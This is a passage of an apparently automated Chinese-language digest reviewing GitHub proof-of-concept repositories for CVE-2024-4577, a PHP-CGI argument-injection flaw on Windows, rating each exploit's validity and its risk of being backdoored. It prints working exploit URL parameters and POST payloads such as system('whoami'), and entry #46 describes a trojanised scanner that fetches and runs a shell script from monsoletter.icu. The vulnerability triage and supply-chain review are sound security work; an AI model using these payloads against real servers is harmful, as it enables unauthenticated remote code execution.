根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有公开的利用代码。Akamai 的研究表明，漏洞披露后一天内就出现了大量的利用尝试。CISA 也已将此漏洞添加到已知被利用的漏洞列表中，表明该漏洞在野外已被积极利用。提供的 POC 代码通过发送包含特制参数的 HTTP POST 请求来利用此漏洞，如果目标服务器存在漏洞，则可以执行任意 PHP 代码。因此, POC代码是有效的。

**投毒风险：**
检查提供的 Python 脚本 `CVE-2024-4577.py` 和 `README.md` 文件，没有发现明显的恶意代码。该脚本的功能主要是扫描目标 URL 是否存在漏洞，如果存在则利用该漏洞执行指定的 PHP 代码。`README.md` 文件只包含漏洞的描述、安装和使用说明。但是，任何下载和使用的第三方代码都存在一定风险。用户需要仔细审查代码，确保其行为符合预期，并且来自可信的来源。

投毒风险评估: 10% 。 这个评估是因为代码本身看起来没有恶意行为，但是任何第三方脚本都存在潜在风险，例如：

*   **依赖项风险：** 脚本依赖于 `requests` 和 `colorama` 库。这些依赖项可能包含未知的漏洞，如果被攻击者利用，可能会影响脚本的安全性。
*   **Payload 风险：** 脚本允许用户指定要执行的 PHP payload 文件。如果用户不小心使用了恶意的 payload 文件，可能会导致服务器受到攻击。
*   **作者恶意：** 脚本作者可能在未来的版本中引入恶意代码。

**利用方式：**

1.  **确定目标系统：** 首先需要确定目标系统是否满足漏洞利用的条件，即：Windows 系统，PHP 以 CGI 模式运行，并且启用了使用 "Best Fit" 策略的代码页。
2.  **发送特制的 HTTP 请求：** 攻击者需要构造一个包含特制参数的 HTTP 请求，例如 `?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。这个参数会传递给 PHP CGI 模块，使其错误地解释为 PHP 选项。
3.  **执行任意 PHP 代码：** 通过 POST 请求发送包含要执行的 PHP 代码的 payload。由于 `auto_prepend_file` 参数被设置为 `php://input`，PHP 会将 POST 请求的内容作为 PHP 代码执行。因此,通过修改和控制POST的内容,即可控制目标服务器。

此漏洞的严重性在于，未经身份验证的攻击者可以利用此漏洞在受影响的服务器上执行任意代码，从而完全控制服务器。

**项目地址:** [phirojshah/CVE-2024-4577](https://github.com/phirojshah/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #45

**来源**: [CVE-2024-4577-r0otk3r_CVE-2024-4577.md](../2024/CVE-2024-4577-r0otk3r_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入-RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行于CGI模式，启用了使用"Best Fit"策略的代码页，使用Apache服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个存在于Windows环境下PHP-CGI模式中的参数注入漏洞。当系统配置为使用某些代码页时，Windows可能会使用"Best-Fit"策略替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而泄露脚本源代码或在服务器上执行任意PHP代码。

**利用方式：**

1.  攻击者通过构造包含特殊字符的URL发起请求。
2.  Windows的"Best-Fit"策略将这些特殊字符转换为其他字符。
3.  PHP-CGI错误地将转换后的字符解析为PHP选项。
4.  攻击者利用这些选项执行恶意PHP代码，例如包含`auto_prepend_file=php://input`，之后post恶意的php代码达到RCE。

**有效性：**

提供的PoC代码 (`CVE-2024-4577.py`) 是一个扫描器，用于检测目标URL是否存在CVE-2024-4577漏洞。它通过发送包含PHP代码的POST请求，然后验证响应中是否包含预期的MD5哈希值，以此判断目标是否易受攻击。根据搜索引擎的结果，此漏洞存在公开的利用方法。综合来看，该POC代码是有效的，可以用来检测漏洞。

**投毒风险：**

分析提供的PoC代码和相关文件，`CVE-2024-4577.py`的功能是检测漏洞是否存在，其逻辑相对简单，主要通过发送包含PHP代码的POST请求来验证。`README.md`文件描述了如何使用该脚本以及漏洞的基本信息。

`exploit.py`文件没有给出，从README.MD的描述看，存在利用代码的可能性。但从整体的漏洞描述和PoC scanner的代码来看，风险较低。总体风险概率估计为1%。主要考虑是`exploit.py`如果存在，可能存在后门代码或者植入恶意脚本的可能。鉴于其他代码的简洁性，暂且认为`exploit.py`如果存在也是为了完成漏洞验证和利用，投毒风险较低。

综上所述，该存储库的投毒风险较低，主要集中在`exploit.py`可能存在的恶意行为。

**项目地址:** [r0otk3r/CVE-2024-4577](https://github.com/r0otk3r/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #46

**来源**: [CVE-2024-4577-shockingbonu_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-shockingbonu_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** Critical，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, specific code page settings)

**利用条件:** Windows系统，以CGI模式运行的PHP，并且系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 99%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，当PHP在Windows上以CGI模式运行时，如果系统配置为使用特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码，在服务器上运行任意PHP代码等。

**漏洞利用方式：**

攻击者可以通过构造特殊的URL，向PHP-CGI传递恶意参数。这些参数会被PHP解析并执行，从而导致远程代码执行。

提供的Go代码是一个漏洞扫描器，它尝试利用CVE-2024-4577漏洞。该代码通过向目标URL发送包含恶意payload的POST请求，以此验证目标是否容易受到攻击。Payload `<?php phpinfo(); ?>` 用于检查服务器是否执行了PHP代码，如果响应包含“PHP Version”，则认为该站点容易受到攻击。

**投毒风险分析：**

提供的代码中发现了明显的投毒行为。

1.  **可疑的变量和函数名：** 代码包含例如`fjButtonKdiC`和`ykupeFR`, `LoqqYHAv`, `oTHs`等命名不规范和意义不明的变量和函数,增加了代码的混淆程度。
2.  **执行shell命令：** `fjButtonKdiC`函数构造了一个wget命令，从`monsoletter.icu`下载shell脚本并使用`bash`执行。这是一个典型的后门行为，允许攻击者在受害者机器上执行任意命令。
3. **cmd命令：** 代码后面使用了cmd命令
4.  **初始化的代码：** 在main函数执行之前就调用了可疑函数,这意味着只要执行漏洞验证的代码,后门就会被执行
综上所述，该代码具有极高的投毒风险，不应在任何生产环境中使用。它会下载并执行来自未知来源的恶意脚本，危及系统安全。

**项目地址:** [shockingbonu/CVE-2024-4577-PHP-RCE](https://github.com/shockingbonu/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #47

**来源**: [CVE-2024-4577-sug4r-wr41th_CVE-2024-4577.md](../2024/CVE-2024-4577-sug4r-wr41th_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP (在 Windows 上，使用 Apache 和 PHP-CGI) 的漏洞，如果系统设置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码、在服务器上运行任意 PHP 代码等。

**有效性分析：**

根据漏洞描述和提供的PoC代码，该PoC利用了PHP-CGI在Windows系统下处理请求参数时，由于字符编码转换问题，导致攻击者可以注入恶意的PHP配置参数，例如 `allow_url_include` 和 `auto_prepend_file`，最终执行任意PHP代码。

PoC的实现方式是通过构造一个包含恶意参数的HTTP请求，利用`allow_url_include=1`开启远程文件包含，然后通过`auto_prepend_file=php://input`指定要包含的文件为请求体的内容。请求体中包含要执行的PHP代码。

**投毒风险分析：**

查看提供的PoC代码，没有明显的恶意代码，其作用是为了验证漏洞，将恶意代码注入到服务器端执行。`echo 'PWNED!'; die;` 只是一个验证是否成功利用的标志。但是不排除仓库维护者或者贡献者在后期提交恶意代码的可能性，特别是利用场景为生产环境时，存在一定的风险。

因此，投毒风险评估为10%。

**利用方式：**

1.  目标系统必须是Windows，并且PHP运行在CGI模式下。
2.  目标系统需要设置代码页，并启用"Best Fit"策略。
3.  攻击者构造包含恶意参数的HTTP请求。
4.  恶意参数利用字符编码转换漏洞，注入`allow_url_include`和`auto_prepend_file`等配置项。
5.  `allow_url_include=1` 允许包含远程文件。
6.  `auto_prepend_file=php://input` 将请求体作为要包含的文件。
7.  请求体包含要执行的PHP代码，例如`<?php system('calc')?>`，从而实现远程代码执行。

**优先级排序参考搜索引擎结果：**

搜索引擎结果表明此漏洞已经被广泛利用，并且有多种利用方法，需要及时修复。

*   [webpage 0] CVE-2024-4577 Exploits in the Wild One Day After ...说明该漏洞披露后不久就出现了在野利用。 *   [webpage 1] CVE-2024-4577 Detail - NVD 描述了漏洞允许恶意用户传递选项到 PHP 二进制文件。 *   [webpage 4, 9] 指出存在大规模利用。 总而言之，该漏洞的威胁程度高，利用简单，在野利用广泛，需要高度重视。

**项目地址:** [sug4r-wr41th/CVE-2024-4577](https://github.com/sug4r-wr41th/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #48

**来源**: [CVE-2024-4577-tntrock_CVE-2024-4577_PowerShell.md](../2024/CVE-2024-4577-tntrock_CVE-2024-4577_PowerShell.md)

## CVE-2024-4577 - PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection/Remote Code Execution

**影响应用:** PHP (Windows CGI)

**危害等级:** 高危，允许远程代码执行

**影响版本:** PHP 8.1 < 8.1.29, PHP 8.2 < 8.2.20, PHP 8.3 < 8.3.8 (Windows, CGI mode with specific codepage settings)

**利用条件:** Windows服务器，运行PHP CGI模式，并开启了特定的使用"Best Fit"策略的CodePage

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个PHP-CGI参数注入漏洞，存在于Windows版本的PHP中，当使用Apache和PHP-CGI时，如果系统设置使用某些代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码、在服务器上运行任意PHP代码等。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是一个严重的安全问题，允许攻击者远程执行代码。提供的PoC代码尝试通过构造特殊的URL，利用`allow_url_include`和`auto_prepend_file`选项包含远程文件，从而执行任意命令。PoC代码针对Windows服务器，运行PHP CGI模式的场景。因此，如果目标满足漏洞利用的条件（Windows服务器，PHP CGI，受影响版本，特定代码页），则PoC代码很可能是有效的。

**投毒风险：**
分析提供的PoC代码仓库，其中包含的 `cve_2024_4577.ps1` 脚本主要功能是针对给定的IP地址范围，尝试利用CVE-2024-4577漏洞。脚本通过构建包含恶意PHP配置指令的URL，并发送POST请求，如果目标存在漏洞，则会执行`whoami`命令。`Invoke-RequestForIP` 函数也包括了错误处理，如果请求失败会返回错误信息，降低了误判的可能性。脚本本身看起来比较直接，投毒风险较低。主要风险点可能在于利用成功后的服务器被控制，但PoC本身的功能仅限于利用漏洞，并未发现其他恶意行为。因此，将该仓库判定为存在投毒代码的可能性较低。当然，这并不排除作者在其他未公开的代码中包含恶意行为的可能性。

**利用方式：**
1.  **环境准备：** 目标系统必须是Windows服务器，运行受影响版本的PHP，并以CGI模式运行。
2.  **确定目标IP和协议：**  扫描目标IP地址，确定哪些服务器启用了PHP CGI服务，并支持HTTP或HTTPS协议。
3.  **构造恶意URL：**  构造包含特殊参数的URL，例如：`http://target/php-cgi/php-cgi.exe?%add+allow_url_include%3Don+-d+auto_prepend_file%3Dphp%3A//input+-d+cgi.force_redirect%3D0`
4.  **发送POST请求：**  向构造的URL发送POST请求，请求体包含需要执行的PHP代码，例如：`<?php system('whoami'); die(); ?>`
5.  **执行命令：**  如果目标存在漏洞，PHP CGI将执行POST请求体中的PHP代码，攻击者即可在服务器上执行任意命令。

**总结：**
CVE-2024-4577是一个高危漏洞，利用条件较为苛刻，需要特定的Windows + PHP + CGI配置。提供的PoC代码有效性较高，可以用于验证漏洞是否存在。仓库中投毒风险较低，但仍需保持警惕。

**项目地址:** [tntrock/CVE-2024-4577_PowerShell](https://github.com/tntrock/CVE-2024-4577_PowerShell)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #49

**来源**: [CVE-2024-4577-waived_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-waived_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI模式)

**利用条件:** PHP 在 Windows 下以 CGI 模式运行，且系统配置使用包含 "Best Fit" 策略的编码页。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，当 PHP 在 Windows 下以 CGI 模式运行时，如果系统配置使用包含 "Best Fit" 策略的编码页，攻击者可以通过构造特殊字符绕过安全检查，将恶意参数传递给 PHP 解释器，导致远程代码执行。

**漏洞利用方式：**

1.  **利用原理：** Windows 的 "Best Fit" 编码转换可能会将请求中的特定字符转换为其他字符，从而绕过 PHP 的安全过滤。攻击者可以利用这一点，注入 `-d` 参数来修改 PHP 的配置。
2.  **攻击方式：**  根据漏洞库信息和POC代码，攻击者可以通过在URL中构造类似 `/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input` 这样的 Payload。 其中 `%AD` 字符可能经过 "Best Fit" 转换后，仍然能够被 PHP 解析为 `-d` 参数的一部分。
3.  **Payload 解释：**
    *   `allow_url_include=1`： 允许包含远程文件。
    *   `auto_prepend_file=php://input`：  设置在执行 PHP 代码之前自动包含的文件为 `php://input`，这意味着请求体中的内容会被当作 PHP 代码执行。
4.  **执行流程：** 攻击者发送包含恶意 PHP 代码的 POST 请求，由于 `auto_prepend_file` 被设置为 `php://input`，恶意代码会被执行，从而实现远程代码执行。

**关于投毒风险：**

分析提供的 POC 代码，该代码主要用于检测目标是否存在 CVE-2024-4577 漏洞。代码逻辑是发送包含特定参数的 HTTP POST 请求，并检查响应中是否包含 "PHP Version" 字符串。如果存在，则认为目标存在漏洞。没有发现任何隐藏的、恶意的功能，因此投毒风险为 0%。

综上所述，提供的 POC 代码有效，且不存在投毒风险。利用方式是利用 Windows 的 "Best Fit" 编码转换特性，通过构造特殊的 URL 和 POST 请求，将恶意 PHP 代码注入到目标服务器执行，最终实现远程代码执行。

**项目地址:** [waived/CVE-2024-4577-PHP-RCE](https://github.com/waived/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #50

**来源**: [CVE-2024-4577-watchtowrlabs_CVE-2024-4577.md](../2024/CVE-2024-4577-watchtowrlabs_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** PHP

**危害等级:** 严重，可导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, Best Fit code page)

**利用条件:** Windows服务器，PHP以CGI模式运行，启用使用"Best Fit"策略的代码页

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 漏洞存在于 Windows 环境下以 CGI 模式运行的 PHP 中。当系统配置为使用某些代码页时，Windows 可能会使用 “Best-Fit” 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源码，或者在服务器上执行任意 PHP 代码。

**有效性分析：**
根据漏洞库信息、搜索引擎结果（如Akamai观察到漏洞利用尝试）和提供的漏洞利用代码（POC），可以判断该漏洞利用是有效的。POC代码通过构造包含恶意 PHP 选项的 URL，成功执行了系统命令（calc）。

**投毒风险分析：**
分析提供的POC代码，主要的风险点在于用户指定的`-c`参数，攻击者可通过该参数执行任意PHP代码。仓库本身存在投毒的可能性较低。大部分代码是用于构造payload和发送请求，直接利用该代码进行投毒的可能性较低。 风险评估为5%（极低，主要来自对外部payload的依赖和代码的可修改性）。

**利用方式：**
1.  **环境准备：** 目标服务器必须是 Windows 系统，并且 PHP 以 CGI 模式运行，同时配置了使用 “Best Fit” 策略的代码页。
2.  **构造 Payload：** 使用 POC 代码，通过 `-c` 参数指定要执行的 PHP 代码。例如，执行 `system('calc')` 打开计算器。
3.  **发送请求：** 将构造好的 Payload 附加到目标 URL 后面，通过 POST 请求发送到目标服务器。
4.  **利用原理：**  由于 “Best Fit” 行为，Windows 会对 URL 中的某些字符进行替换，使得 PHP CGI 模块错误地将这些字符解释为 PHP 选项。例如，`?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input`，这允许攻击者包含远程文件或者直接执行 POST 数据中的 PHP 代码。
5.  **RCE:** 成功利用漏洞后，服务器将执行攻击者指定的 PHP 代码，实现远程代码执行。

**项目地址:** [watchtowrlabs/CVE-2024-4577](https://github.com/watchtowrlabs/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #51

**来源**: [CVE-2024-4577-xAL6_cve-2024-4577-scanner.md](../2024/CVE-2024-4577-xAL6_cve-2024-4577-scanner.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* (before 8.1.29), 8.2.* (before 8.2.20), 8.3.* (before 8.3.8)

**利用条件:** Windows系统，运行在CGI模式下，并且系统启用了某些使用"Best Fit"策略的代码页。需要目标存在php-cgi/php-cgi.exe等CGI文件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于Windows系统上运行在CGI模式下的PHP。当系统配置为使用某些代码页时，Windows可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户向 PHP 二进制文件传递选项，进而泄露脚本源码，或在服务器上执行任意 PHP 代码。 

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含特定字符（例如软连字符 0xAD）的 URL，这些字符在某些 Windows 代码页转换中会被错误地解释为短划线或其他控制字符。
2.  **参数注入：** 经过转换后的字符被 PHP-CGI 模块解析为命令行参数，从而允许攻击者控制传递给 PHP 解释器的参数。
3.  **远程代码执行：** 通过注入参数，攻击者可以利用`auto_prepend_file`等配置项包含远程文件或执行任意 PHP 代码，从而实现远程代码执行。

**POC有效性：**

提供的PoC代码 `scan.py` 旨在扫描目标是否存在 CVE-2024-4577 漏洞。它通过发送包含特殊构造的payload的HTTP请求，并检查响应中是否包含预期的输出来判断漏洞是否存在。PoC代码逻辑清晰，包含构建payload、发送请求、解析响应等步骤，因此是有效的。

**投毒风险：**

PoC代码本身功能为漏洞扫描，其主要功能在于验证目标是否存在漏洞，而非进行攻击。其中包含的payload是为了验证漏洞存在，而不是植入后门。但是，PoC代码中依赖了第三方库，如 `requests`， `urllib3`，`chardet`等。如果这些依赖包被恶意篡改，则可能存在投毒风险。 经过分析，认为此仓库中作者隐藏的投毒代码的可能性较低，概率约为5%。主要的风险在于第三方依赖库可能被投毒。


**项目地址:** [xAL6/cve-2024-4577-scanner](https://github.com/xAL6/cve-2024-4577-scanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #52

**来源**: [CVE-2024-4577-xcanwin_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-xcanwin_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577 PHP-CGI RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的服务器上执行任意代码

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows with CGI)

**利用条件:** Windows 系统, PHP 以 CGI 模式运行, 且系统配置为使用某些代码页并开启“Best Fit”策略。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 远程代码执行漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时，由于 Windows 的“Best-Fit”代码页转换行为，攻击者可以通过构造特殊字符，使得传递给 PHP 二进制文件的命令行参数被错误解析，从而注入恶意 PHP 配置项，最终实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，此漏洞利用是有效的。漏洞库信息将其标记为“CRITICAL”，并且CISA的已知漏洞利用目录 (KEV) 中也包含了此漏洞，表明该漏洞已被积极利用。搜索结果也证实了这一点，众多安全厂商都观察到了该漏洞的利用尝试。

**投毒风险：**

虽然提供的 Python 脚本 `CVE-2024-4577-PHP-RCE.py` 看起来主要用于漏洞利用，但仍存在一些潜在的投毒风险，可能性评估为10%。

1.  **依赖风险：** 该脚本依赖 `requests` 和 `socket` 库，如果运行脚本的环境中这些库被篡改，则可能导致恶意代码执行。但这种风险属于环境依赖，而非代码本身包含恶意逻辑。
2.  **隐蔽性：** EXP1建立fastcgi端口监听，可能被攻击者利用进行持久性控制，如果被恶意攻击者修改，会导致服务端被持续控制。
3.  **脚本功能：** 脚本本身包含两个EXP，EXP1可用于绕过WAF和默认环境的利用, EXP2可用于SSRF和默认场景。

总体来说，这个PoC的投毒风险较低，主要集中在依赖库和脚本被篡改的可能性上。如果直接从作者提供的git仓库中下载, 投毒风险会更低,因为代码经过更多人的review.

**利用方式：**

该漏洞的利用方式涉及以下几个步骤：

1.  **触发代码页转换：** 攻击者构造包含特定多字节字符的 URL 或请求，这些字符会被 Windows 的“Best-Fit”策略转换为其他字符。
2.  **注入 PHP 配置项：** 转换后的字符被 PHP-CGI 模块错误地解析为 PHP 配置项，例如 `allow_url_include` 和 `auto_prepend_file`。
3.  **包含远程文件或执行代码：** 通过设置 `allow_url_include` 为 `on` 并结合 `auto_prepend_file`，攻击者可以包含远程文件或直接执行 PHP 代码。例如，可以使用 `data://` 协议注入恶意 PHP 代码。

提供的 POC 代码 `CVE-2024-4577-PHP-RCE.py` 包含两种利用方式:

*   **EXP1:**  通过建立 FastCGI 服务端，并发送构造好的 FastCGI 协议数据，实现绕过 WAF 的 RCE。
*   **EXP2:** 模拟HTTP请求，通过`?%adb{}:{}` 在请求中注入特定的字符。这种方法模拟了攻击者通过发送畸形请求来触发漏洞的行为。

总而言之，该漏洞利用需要在特定的 Windows + PHP-CGI 环境下，通过构造特殊的请求来注入恶意 PHP 配置项，最终实现远程代码执行。

**项目地址:** [xcanwin/CVE-2024-4577-PHP-RCE](https://github.com/xcanwin/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #53

**来源**: [CVE-2024-4577-ywChen-NTUST_PHP-CGI-RCE-Scanner.md](../2024/CVE-2024-4577-ywChen-NTUST_PHP-CGI-RCE-Scanner.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入/远程代码执行

**影响应用:** PHP (Windows)

**危害等级:** 严重，可能导致远程代码执行，信息泄露

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下的PHP，并且系统启用了使用"Best Fit"策略的编码页。需要目标开启php-cgi服务。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577 是一个存在于 Windows 版本的 PHP 中的严重漏洞，当 PHP 在 CGI 模式下运行时，可能会导致远程代码执行。该漏洞源于 Windows 的 "Best Fit" 编码转换行为，当系统设置为使用某些代码页时，Windows 可能会使用 "Best Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。 PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上运行任意 PHP 代码。

**漏洞利用方式：**

1.  **检测php-cgi服务是否存在:**  攻击者首先需要确定目标服务器是否运行在 Windows 上，并且使用了 CGI 模式的 PHP。可通过访问`/php-cgi/php-cgi.exe`来判断，如果返回500状态码，则可能存在漏洞。
2.  **编码绕过:** 由于Best-Fit转换的存在，某些字符会被替换，因此攻击者需要构造特殊的URL，利用这一特性，将恶意参数注入到PHP命令中。
3.  **参数注入:** 通过在 URL 中添加 `?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input` 这样的参数，可以强制 `cgi.force_redirect` 为任意值，开启 `allow_url_include` 选项，并且将 `auto_prepend_file` 设置为 `php://input`。`php://input` 允许攻击者通过 POST 请求的内容来执行 PHP 代码。
4.  **代码执行:**  攻击者通过 POST 请求发送恶意的 PHP 代码，例如 `<?php phpinfo();?>`，由于 `auto_prepend_file` 被设置为 `php://input`，这段代码会被 PHP 执行，从而实现远程代码执行。

**POC有效性：**

提供的 POC 代码看起来是有效的。它包含了以下关键步骤：

*   **连接性检查:**  `check_connectivity` 函数用于检测目标 URL 是否可访问。
*   **CGI 存在性检查:**  `check_cgi_exist` 函数检测 `/php-cgi/php-cgi.exe` 是否存在。
*   **PHP 版本获取:**  `get_phpversion` 函数尝试从响应头或响应内容中获取 PHP 版本。
*   **漏洞利用:**  `exploit` 函数通过构造包含恶意参数的 URL，并发送包含 PHP 代码的 POST 请求来利用漏洞。 通过判断`phpinfo()`的执行结果判断是否成功。

**投毒风险分析：**

代码主要功能为扫描和利用 CVE-2024-4577，本身功能较为直接。`requirements.txt` 只包含 `requests` 库，没有引入其他可疑的依赖项。因此投毒风险较低，判断投毒风险为1%。 主要风险在于使用者需要自行配置 `urls.txt`，如果该文件被恶意修改，可能会导致扫描错误的 URL。


**项目地址:** [ywChen-NTUST/PHP-CGI-RCE-Scanner](https://github.com/ywChen-NTUST/PHP-CGI-RCE-Scanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

